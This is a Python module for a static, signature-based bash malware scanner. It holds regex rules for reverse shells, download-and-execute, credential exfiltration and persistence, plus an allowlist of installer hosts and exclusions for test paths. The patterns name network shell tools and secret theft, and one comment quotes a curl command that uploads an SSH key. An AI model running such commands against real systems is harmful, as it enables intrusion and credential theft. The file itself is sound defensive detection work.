"""Custom bash malware scanner; Layer 1 (static/signature), doc 03.

No adequate free bash-specific scanner exists, so this is our own (doc 03 sec 1).
Layer 1 inspects code without executing it, across the full attack surface
(doc 03 sec 2): enumeration, persistence, lateral movement, exfiltration,
reverse shells, process injection, credential harvesting, network scanning, and
obfuscation/evasion. It recursively finds bash and bash-bearing files; shell
embedded in setup scripts, CI workflows, Dockerfiles (doc 03 sec 4); and emits
per-file, categorized findings (doc 03 sec 5).

Layer 2 (sandboxed behavioral execution, doc 03 sec 3.2) is deliberately out of
scope here; it is the heavy lift and lands later.

Pure functions over text/paths: fully unit-testable with no execution.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path

# Per-category severity weight (reverse shells / exfil / download-exec are the
# strongest signals; enumeration is common and weak on its own).
_WEIGHTS = {
    "reverse_shell": 5,
    "download_exec": 4,
    "exfiltration": 4,
    "obfuscation": 3,
    "persistence": 3,
    "credential_harvest": 3,
    "process_injection": 3,
    "lateral_movement": 2,
    "network_scan": 2,
    "enumeration": 1,
}

_INSTALL_HOST_RE = re.compile(r"https?://([A-Za-z0-9.\-]+)", re.I)

# Hosts whose `curl <host> | sh` is a documented, official bootstrap rather than a
# dropper. This is the ONE list; the manifest scanner and the Tier-2 fetch gate both
# import it from here. It used to be duplicated as a short inline alternation inside
# the curl-pipe-shell regex, and the two copies drifted: the 2026-07-21 hunt
# confirmed photoprism (claude.ai), cyotee/crane (release.anza.xyz) and
# adityavanjre/project-k (ollama.com) purely because those hosts were reputable to
# one copy and unknown to the other.
_REPUTABLE_INSTALL_HOSTS = (
    "install.meteor.com", "sh.rustup.rs", "rustup.rs", "static.rust-lang.org",
    "deb.nodesource.com", "get.docker.com", "download.docker.com", "bun.sh",
    "astral.sh", "deno.land", "install.python-poetry.org", "get.pnpm.io",
    "apt.llvm.org", "get.helm.sh", "packages.microsoft.com", "cli.github.com",
    "nodejs.org", "python.org",
    # OS package mirrors: a Dockerfile pulling from the distro is a build step.
    "deb.debian.org", "archive.ubuntu.com", "security.ubuntu.com", "dl-cdn.alpinelinux.org",
    # Package registries: pulling a passive artifact from one is a build step, not a
    # dropper (the fa0311/twitter-openapi folderOpen venv+pip+curl-maven-jar FP,
    # 2026-07-07). Attacker C2s (e.g. *.vercel.app droppers) are NOT here, so a
    # curl|bash to one still confirms.
    "repo1.maven.org", "repo.maven.apache.org", "registry.npmjs.org",
    "pypi.org", "files.pythonhosted.org", "crates.io", "static.crates.io",
    "proxy.golang.org", "rubygems.org",
    # Named-toolchain installers that publish an official `curl <host> | sh` (same
    # shape as rustup): Foundry (Ethereum), Homebrew, Starship, Volta, nvm, Semgrep.
    "foundry.paradigm.xyz", "raw.githubusercontent.com/foundry-rs", "get.brew.sh",
    "starship.rs", "get.volta.sh", "raw.githubusercontent.com/nvm-sh", "semgrep.dev",
    # Vendor installers seen in the 2026-07-21 false-positive batch.
    "claude.ai", "ollama.com", "release.anza.xyz", "get.k3s.io", "sdk.cloud.google.com",
    "packages.cloud.google.com", "aka.ms", "dl.google.com", "storage.googleapis.com",
    "uv.astral.sh", "mise.run", "get.sdkman.io", "install.determinate.systems",
    "nixos.org", "tailscale.com", "get.nextflow.io", "micro.mamba.pm",
    # Vendor package repositories with an official `curl <host>/script.deb.sh | bash`
    # (nvidia/aistore confirmed on GitLab's own runner installer, 2026-07-22).
    "packages.gitlab.com", "packagecloud.io", "apt.releases.hashicorp.com",
    "download.opensuse.org", "dl.yarnpkg.com", "deb.nodesource.com",
    "packages.confluent.io", "repos.influxdata.com", "packages.elastic.co",
)


def is_reputable_install_host(host: str) -> bool:
    """True if ``host`` is a known toolchain-installer / package-registry host, so a
    ``curl <host> | sh`` is a normal bootstrap rather than a dropper. Shared with the
    manifest scanner and the Tier-2 fetch-target gate so every layer agrees."""
    h = (host or "").lower().rstrip(".")
    return any(h == r or h.endswith("." + r) for r in _REPUTABLE_INSTALL_HOSTS)


def _all_hosts_reputable(line: str) -> bool:
    """True if the line has URL hosts and every one of them is a reputable installer."""
    hosts = [h.lower().rstrip(".") for h in _INSTALL_HOST_RE.findall(line or "")]
    return bool(hosts) and all(is_reputable_install_host(h) for h in hosts)


# Category -> (rule name, regex). Case-insensitive, matched per line.
_RULES: dict[str, list[tuple[str, re.Pattern]]] = {
    "reverse_shell": [
        ("dev-tcp-redirect", re.compile(r"/dev/tcp/|/dev/udp/", re.I)),
        # shai-hulud-detect FP (2026-07-02): "${NC}"/"$NC" is the ubiquitous
        # shell convention for a "No Color" ANSI reset variable, which an
        # unrelated "-e" later on the same line (e.g. prose about Bash's
        # `set -e`) then completed into a false nc-exec match. The negative
        # lookbehind excludes "nc"/"NC" as a variable reference; a real
        # `nc -e ...` invocation (never preceded by `{`/`$`) still matches.
        ("nc-exec", re.compile(r"(?<![{$])\bn(?:c|cat)\b[^\n]*\s-e\b", re.I)),
        ("bash-i-socket", re.compile(r"bash\s+-i\b[^\n]*(>&|2>&1)", re.I)),
        ("mkfifo-shell", re.compile(r"mkfifo[^\n]*\b(nc|ncat|sh|bash)\b", re.I)),
        ("python-reverse", re.compile(r"socket\.socket[^\n]*(connect|SOCK_STREAM)", re.I)),
    ],
    "download_exec": [
        # curl|bash is dangerous from an ATTACKER host, but it is ALSO the standard
        # install idiom for reputable toolchains (`curl -fsSL deb.nodesource.com/...
        # | bash` in a Dockerfile). The reputable-host exclusion is NOT inlined here
        # any more: it lives in `_REPUTABLE_INSTALL_HOSTS` and is applied by
        # `_is_false_positive`, so there is one list instead of two that drift
        # (2026-07-21 photoprism / crane / project-k FPs).
        ("curl-pipe-shell", re.compile(
            # `python -m json.tool` / `-m http.server` READ stdin as data (pretty-print
            # / serve); they never execute the fetched bytes, so `curl ... | python -m
            # json.tool` is not download-and-run (the localhost/API health-check FPs,
            # 2026-07-07). The lookahead sits BEFORE the interpreter so `python[0-9]?`
            # cannot backtrack past it. Bare `python`, `python -c`, sh/bash/perl confirm.
            r"(curl|wget)\s[^\n|]*\|\s*"
            r"(?!python[0-9]?\s+-m\s+(?:json\.tool|http\.server)\b)"
            r"(sh|bash|perl|python[0-9]?)", re.I)),
        ("fetch-then-exec",
         re.compile(r"(curl|wget)\s[^\n]*-o\s*\S+[^\n]*;\s*(sh|bash|chmod)", re.I)),
    ],
    "exfiltration": [
        ("discord-webhook", re.compile(r"discord(?:app)?\.com/api/webhooks/", re.I)),
        ("telegram-bot", re.compile(r"api\.telegram\.org/bot", re.I)),
        # curl/wget POSTING or UPLOADING a secret FILE is credential exfil (the
        # data is the tell, not the host): `curl -d @~/.ssh/id_rsa http://x`.
        # The upload flags MUST be case-sensitive, exactly as in curl-post-data below.
        # Under a blanket re.I, `-F` (form-upload) also matched curl's ubiquitous
        # benign `-f` ("fail silently"), so a plain DOWNLOAD of a template file --
        # `curl -fsSL "$RAW_BASE/.env.example" -o "$dir/.env.example"` -- confirmed as
        # credential exfiltration. That single collision produced the highest-scoring
        # false positive of the 2026-07-21 hunt (adityavanjre/project-k, score 90).
        # `-o`/`--output` is also excluded outright: it writes the response to disk,
        # which is a fetch, the opposite direction from exfil.
        ("secret-exfil", re.compile(
            r"\b(?:curl|wget)\b(?![^\n]*(?-i:\s-o\b|\s--output\b))"
            r"[^\n]*(?:(?-i:\s-d\b|\s-F\b|\s-T\b)|--data(?:-binary)?\b|--form\b|--upload-file\b)"
            r"[^\n]*(?:id_rsa|id_ed25519|\.ssh/|\.aws/credentials|/etc/shadow|/etc/passwd|"
            r"\.env\b|credentials?\.(?:json|ya?ml)|secrets?\.(?:json|ya?ml|txt))", re.I)),
        # The exfil flags are case-SENSITIVE: -d (data), -F (form), -T (upload).
        # Matching them under re.I made curl's ubiquitous benign -f ("fail
        # silently", as in every `curl -f http://localhost/health` Docker
        # HEALTHCHECK) collide with -F and confirm as exfiltration. The (?-i:)
        # scope keeps -f benign while curl/Curl still matches (2026-07-06 FP audit).
        ("curl-post-data",
         re.compile(r"\bcurl\b.*(?-i:\s-[dFT]\b|\s--data\b|\s--upload-file\b)", re.I)),
        ("archive-then-send", re.compile(r"(tar|zip|gzip)\b[^\n]*\|\s*(curl|nc|wget)", re.I)),
    ],
    "persistence": [
        ("cron", re.compile(r"\bcrontab\b|/etc/cron|@reboot", re.I)),
        ("rc-files", re.compile(r">>\s*~?/?\.?(bashrc|bash_profile|profile|zshrc)\b", re.I)),
        ("systemd", re.compile(r"systemctl\s+enable|/etc/systemd/system/", re.I)),
        ("authorized-keys", re.compile(r"\.ssh/authorized_keys", re.I)),
        ("rc-local", re.compile(r"/etc/rc\.local|launchctl\s+load", re.I)),
    ],
    "credential_harvest": [
        ("ssh-keys", re.compile(r"id_rsa|id_ed25519|\.ssh/id_", re.I)),
        ("cloud-creds", re.compile(r"\.aws/credentials|\.config/gcloud|\.azure/", re.I)),
        # READING/exfiltrating /etc/shadow (password hashes) is theft; but
        # CIS-hardening scripts legitimately chmod/chown/stat/ls it (2026-07-02
        # audit FP). Require a read/copy/exfil verb, or a pipe/redirect out, so a
        # permission-management line no longer confirms. /etc/passwd is
        # benign/ubiquitous and never flagged.
        # Second branch requires the pipe/redirect to reach a REAL command/path, not
        # a bare "|": a scanner's own sensitive-path REGEX ('/etc/shadow|\.gitconfig')
        # is an alternation, not an exfil pipe (the dnszlsk/muad-dib FP, 2026-07-07).
        # Primary: a read/copy/exfil VERB reaching /etc/shadow (high precision).
        # Secondary is deliberately TIGHT -- an IMMEDIATE redirect to a real capture
        # file (not /dev/null, no gap): a loose `[^\n]*` version matched `2>/dev/null`
        # and the `||` after "/etc/shadow readable!" in a warning string
        # (arry8/openclaw-edge hardening audit, 2026-07-07).
        ("shadow-read", re.compile(
            r"\b(?:cat|less|more|head|tail|cp|scp|rsync|dd|xxd|strings|od|base64|"
            r"awk|sed|nc|curl|wget|tar|zip|gzip)\b[^\n]*/etc/shadow"
            r"|/etc/shadow\b\s*>>?\s*(?!/dev/null\b)[\w/.]", re.I)),
        ("env-token-grab", re.compile(r"\b(AWS_SECRET|GITHUB_TOKEN|NPM_TOKEN|API_KEY)\b", re.I)),
    ],
    "process_injection": [
        # LD_PRELOAD is legitimately used to preload memory allocators and
        # sanitizers (jemalloc/tcmalloc/mimalloc, libasan, ...) -- extremely
        # common in Dockerfiles (the aristoteleo/pantheonos FP, 2026-07-02 was
        # `LD_PRELOAD=.../libjemalloc.so.2`). The negative lookahead suppresses
        # the match when a well-known-legit library is on the same line; a real
        # `LD_PRELOAD=/tmp/evil.so` (no such name) still fires.
        ("ld-preload", re.compile(
            r"(?!.*lib(?:jemalloc|tcmalloc|mimalloc|hugetlbfs|asan|tsan|ubsan|lsan|"
            r"gomp|faketime|eatmydata|umem|profiler|Segfault))\bLD_PRELOAD\b", re.I)),
        ("ptrace-mem", re.compile(r"/proc/\d+/mem|\bptrace\b", re.I)),
        ("gdb-attach", re.compile(r"gdb\s+-p\b", re.I)),
    ],
    "lateral_movement": [
        ("sshpass", re.compile(r"\bsshpass\b", re.I)),
        ("remote-exec", re.compile(r"\b(psexec|wmiexec|pscp)\b", re.I)),
    ],
    "network_scan": [
        ("scanner", re.compile(r"\b(nmap|masscan|zmap)\b", re.I)),
        ("port-sweep", re.compile(r"nc\s+-z\b", re.I)),
    ],
    "enumeration": [
        ("host-recon", re.compile(r"\b(uname\s+-a|whoami|hostname|id)\b", re.I)),
        ("net-recon", re.compile(r"\b(ifconfig|ip\s+addr|netstat|ss\s+-)\b", re.I)),
    ],
    "obfuscation": [
        ("base64-decode-exec", re.compile(r"base64\s+(-d|--decode)[^\n]*\|\s*(sh|bash)", re.I)),
        ("eval-base64", re.compile(r"eval\s[^\n]*base64", re.I)),
        ("hex-escapes", re.compile(r"(?:\\x[0-9a-fA-F]{2}){6,}")),
        ("ifs-obfuscation", re.compile(r"\$\{IFS\}")),
        ("eval-subshell", re.compile(r"eval\s+[\"']?\$\(")),
    ],
}

# Files that carry shell even without a .sh extension (doc 03 sec 4).
_BASH_BEARING_NAMES = {"dockerfile", "makefile", "setup.py", "package.json"}
_BASH_SUFFIXES = {".sh", ".bash", ".ksh", ".zsh"}
_EMBEDDED_SUFFIXES = {".yml", ".yaml"}  # CI workflows etc.
_SHEBANG = re.compile(r"^#!.*\b(ba|z|k)?sh\b")
_MAX_BYTES = 1_000_000

# Paths that are NOT the repo author's executable payload. Two kinds:
#   * Vendored/generated trees (THIRD-PARTY code); the tiledesk FP came from
#     `node_modules/bytes` and `node_modules/content-disposition`.
#   * Test / fixture / example trees, which legitimately contain attack strings
#     as data; the crewhaus FP came from a prompt-injection DETECTOR whose
#     `index.test.ts` cites `webhook.site` / telegram as test fixtures.
# Excluding both means only first-party, shipped code can confirm a finding.
# (Names are compared case-insensitively.)
_IGNORE_DIRS = frozenset({
    ".git", "node_modules", "bower_components", "vendor", "vendored",
    "third_party", "third-party", "dist", "build", "out", ".next", ".nuxt",
    "target", ".venv", "venv", "virtualenv", "site-packages", "__pycache__",
    "pods", ".gradle", ".terraform", ".yarn",
    # Static web root: an ASP.NET / static site ships VENDORED front-end libs under
    # wwwroot/lib (their upstream install hooks are not the repo owner's injection)
    # -- the mahfuznazib/eyehospitalmis swiper postinstall FP, 2026-07-07.
    "wwwroot",
    # non-payload: tests/fixtures/examples carry attack strings as DATA
    "test", "tests", "__tests__", "spec", "__spec__", "fixtures", "fixture",
    "__fixtures__", "mocks", "__mocks__", "e2e", "testdata", "examples", "example",
    # shai-hulud-detect FP (2026-07-02): a worm DETECTOR ships deliberately
    # crafted attack-simulation fixtures to prove its own detection works;
    # these are demo/proof-of-concept payloads, not the repo's real code.
    "test-cases", "test_cases", "testcases", "samples", "sample",
    "poc", "pocs", "demo", "demos",
    # THIRD-PARTY / regression-test trees in large OSS monorepos (2026-07-07 CTF
    # FPs: cheribsd `contrib/netbsd-tests/...sh` nc-exec; freebsd-ports
    # `devel/electron*/files/packagejsons/package.json` npm-preinstall). "contrib"
    # is contributed third-party code; "regress"/"atf" are BSD regression tests;
    # "packagejsons" is the ports tree's vendored npm metadata.
    "contrib", "regress", "atf", "packagejsons", "distinfo",
})
# Directory-name SUFFIXES that mark a test tree even when hyphenated/prefixed
# (netbsd-tests, atf-tests, kyua-tests, lib-tests, ...).
# End-to-end harnesses hold scripted attack commands as test INPUT: the
# antoroute/openclawsecure FP (2026-07-21) confirmed on a driver that printf'd
# "Run exactly this shell command...: cat /etc/shadow > %s" as a probe string.
_TEST_DIR_SUFFIXES = ("-tests", "_tests", "-test", "_test", "-e2e", "_e2e")
_TEST_DIR_EXACT = frozenset({"e2e", "testdata", "test-data", "golden"})
# Test-file name markers (a test file can live anywhere, e.g. `src/x.test.ts`).
_TEST_FILE_MARKERS = (".test.", ".spec.", ".stories.", ".fixture.", ".mock.")
# Language-specific test-file conventions matched by SUFFIX/PREFIX (not loose
# substring, so `latest_release.py` is never mistaken for a `test_` file). The
# garagon/aguara FP (2026-07-02) confirmed on Go `*_test.go` fixtures that the
# JS-style ``.test.`` markers above did not catch.
_TEST_FILE_SUFFIXES = (
    "_test.go", "_test.py", "_test.rs", "_test.ts", "_test.js", "_test.tsx",
    "_tests.py", "_tests.rs", "_spec.rb", ".test.go",
)
_TEST_FILE_EXACT = frozenset({"conftest.py", "tests.rs", "test.rs"})


def is_test_file(name: str) -> bool:
    """True if a filename follows any language's test/fixture convention."""
    low = name.lower()
    if any(m in low for m in _TEST_FILE_MARKERS):
        return True
    if low.endswith(_TEST_FILE_SUFFIXES):
        return True
    if low.startswith("test_") and low.endswith((".py", ".rs", ".go")):
        return True
    return low in _TEST_FILE_EXACT

# Security-DATA files: a malware scanner / advisory feed carries attack strings and
# known-bad package names as DATA, not as a payload it runs. The pkgward-oss FP
# confirmed on `analyze/malware_patterns.py`; the aeon FP on a
# `.../adv_malware_raw.json` advisory cache. Like a test fixture, such a file must
# never CONFIRM a repo malicious. High-signal, security-specific filename markers
# only, so a genuine payload file is never skipped by accident.
_SECURITY_DATA_MARKERS = (
    "malware_pattern", "malware-pattern", "malware_signature", "malware-signature",
    "malware_raw", "malware_sample", "malware_db", "malwaredb",
    "attack_pattern", "attack-pattern", "attack_signature", "threat_signature",
    "yara", "ruleset", "detection_rule", "detection-rule", "_signatures.",
    "ioc_list", "ioc-list", "blocklist", "blacklist", "denylist",
    # cobenian/shai-hulud-detect + idox-genai/shai-hulud-scanner FPs
    # (2026-07-02): a Shai-Hulud-worm DETECTOR's own reference list of the
    # compromised package names it scans for, mistaken for evidence of malice.
    "compromised-package", "compromised_package", "ioc-packages", "ioc_packages",
)


def is_security_data_file(name: str) -> bool:
    """True if a filename is a malware/detection SIGNATURE or advisory DATA file.

    Such a file lists attack strings and known-bad names as reference data (a
    scanner's rule set, an advisory cache), so a match inside it is the tool doing
    its job, not the repo being malicious. Compared case-insensitively.
    """
    low = name.lower()
    return any(marker in low for marker in _SECURITY_DATA_MARKERS)


def is_ignored_path(path: Path) -> bool:
    """True if a path is vendored/generated, a test/fixture, or a security-data
    file (skip for scanning so only first-party PAYLOAD code can confirm)."""
    parts = {p.lower() for p in path.parts}
    if _IGNORE_DIRS & parts:
        return True
    # hyphenated/prefixed test trees (netbsd-tests, atf-tests, live-connector-e2e, ...)
    if _TEST_DIR_EXACT & parts or any(p.endswith(_TEST_DIR_SUFFIXES) for p in parts):
        return True
    name = path.name.lower()
    if is_test_file(name):
        return True
    return is_security_data_file(name)


@dataclass
class BashFinding:
    file: str
    line: int
    category: str
    rule: str
    snippet: str


def is_bash_bearing(path: Path, first_line: str) -> bool:
    """Whether a file should be scanned for shell (doc 03 sec 4)."""
    name = path.name.lower()
    if path.suffix.lower() in _BASH_SUFFIXES or name in _BASH_BEARING_NAMES:
        return True
    if path.suffix.lower() in _EMBEDDED_SUFFIXES and "workflow" in str(path).lower():
        return True
    return bool(_SHEBANG.match(first_line))


# A line that DEFINES a detection pattern is a detector doing its job, not an
# attack. `regexp.MustCompile("(?i)webhook\.site")` inside a security gateway's
# rule table is a signature, the same way a YARA rule file is. Matching it made
# git_warden confirm a defensive product as malware (antoroute/openclawsecure,
# 2026-07-21), which is the file-level `is_security_data_file` idea applied per line
# for tools that keep their rules inline in source rather than in a rules file.
_PATTERN_DEF = re.compile(
    r"regexp\.MustCompile|regexp\.Compile|re\.compile|re\.MustCompile|"
    r"new\s+RegExp|Pattern\.compile|Regex\.new|preg_match|RegexBuilder",
    re.I)

# `/etc/shadow` under a variable or staged prefix (`"$tmp"/etc/shadow`,
# `${DESTDIR}/etc/shadow`, `$ROOTFS/etc/shadow`) is a path INSIDE an image being
# built, not the running host's password file. Distro tooling edits it constantly:
# `sed -i -e 's/^root::/root:*:/' "$tmp"/etc/shadow` in Alpine's own aports tree
# confirmed as credential harvesting on the 2026-07-21 hunt.
_STAGED_SHADOW = re.compile(r"(?:\$\{?\w+\}?|\"\$\{?\w+\}?\")/+etc/shadow")
# `sed -i` / `install -m` WRITE to the file; harvesting requires reading it out.
_SHADOW_WRITE = re.compile(r"\bsed\b[^\n]*\s-i\b|\binstall\b[^\n]*\s-m\b|\bchpasswd\b", re.I)

# Exfiltration sends DATA OUT. `curl -d @file` / `-d @-` reads the body from a file
# or stdin, which is how a real stealer ships what it collected. An inline literal
# body is just an API call: nvidia/aistore confirmed on
# `curl -X POST -d '{"action": "create_bck"}' http://172.50.0.2:8080/v1/buckets`,
# which creates a storage bucket in a local Docker playground. Every REST call in
# every repository has that shape, so the rule needs the data to be a file, a pipe,
# or something named like a secret.
_POST_FROM_FILE = re.compile(r"(?:-d|-F|-T|--data(?:-binary|-raw)?|--form|--upload-file)"
                             r"\s*[\"']?\s*@", re.I)
# A body built from a VARIABLE or a command substitution can carry anything the
# script collected, so it stays exfiltration: `curl -X POST http://c2/ -d "$INFO"`
# after a recon block is the textbook implant. Only a fully STATIC literal body is
# treated as an ordinary API call.
_POST_DYNAMIC = re.compile(
    r"(?:-d|-F|-T|--data(?:-binary|-raw)?|--form|--upload-file)"
    r"\s*[\"']?[^\"'\n]*[$`]", re.I)
_SECRET_NAMED = re.compile(
    r"id_rsa|id_ed25519|\.ssh/|\.aws/|\.env\b|/etc/shadow|credential|secret|token|"
    r"password|passwd|api[_-]?key|private[_-]?key|\.pem\b|keystore|\$\(cat\s", re.I)

# GitHub code-search qualifier syntax inside a string literal is a QUERY the tool
# runs to FIND malware, not malware. n3mes1s/supply-stream, a supply-chain
# detection corpus builder, confirmed on its own search strings, e.g.
# 'type:gzip name:".tgz" content:"discord.com/api/webhooks/" content:"child_process"'.
_SEARCH_QUERY_LITERAL = re.compile(
    r"(?:^|[\s'\"(\[])(?:type|name|content|path|extension|filename|language|repo|org|"
    r"user|size|fork|archived):\s*[\"'][^\"']*[\"']", re.I)


def is_benign_construct(rule: str, line: str) -> bool:
    """True if a matched rule is a known-benign construct and must not be recorded.

    Centralised here rather than bolted onto each regex: a negative lookahead inside
    an already dense pattern is where the duplicated-allowlist and case-folding bugs
    came from. Each branch cites the false positive that motivated it. Shared with
    the content scanner so a detector's inline rule table is neutral in both.
    """
    if _PATTERN_DEF.search(line) or _SEARCH_QUERY_LITERAL.search(line):
        return True
    if rule == "curl-pipe-shell":
        return _all_hosts_reputable(line)
    if rule == "shadow-read":
        return bool(_STAGED_SHADOW.search(line) or _SHADOW_WRITE.search(line))
    if rule == "curl-post-data":
        # Exfiltration needs a body that could hold collected data: read from a
        # file or stdin, built from a variable or command substitution, or named
        # like a secret. A fully static literal body is an ordinary API call.
        return not (_POST_FROM_FILE.search(line) or _POST_DYNAMIC.search(line)
                    or _SECRET_NAMED.search(line))
    return False


def scan_text(text: str, file: str = "<text>") -> list[BashFinding]:
    """Run every rule against each line of text. Pure."""
    findings: list[BashFinding] = []
    for lineno, line in enumerate(text.splitlines(), 1):
        for category, rules in _RULES.items():
            for rule_name, pattern in rules:
                if pattern.search(line) and not is_benign_construct(rule_name, line):
                    findings.append(
                        BashFinding(file, lineno, category, rule_name, line.strip()[:200])
                    )
    return findings


def scan_repo(root: Path) -> list[BashFinding]:
    """Recursively scan a cloned repo's bash-bearing files."""
    root = Path(root)
    findings: list[BashFinding] = []
    for path in root.rglob("*"):
        if not path.is_file() or is_ignored_path(path):
            continue
        try:
            if path.stat().st_size > _MAX_BYTES:
                continue
            with path.open("r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read()
        except OSError:
            continue
        first_line = content.split("\n", 1)[0] if content else ""
        if not is_bash_bearing(path, first_line):
            continue
        rel = str(path.relative_to(root))
        findings.extend(f.__class__(rel, f.line, f.category, f.rule, f.snippet)
                        for f in scan_text(content, rel))
    return findings


def score_findings(findings: list[BashFinding]) -> int:
    """Weighted score. Distinct (category, rule) pairs count once to limit spam."""
    seen = {(f.category, f.rule) for f in findings}
    return sum(_WEIGHTS.get(category, 1) for category, _ in seen)
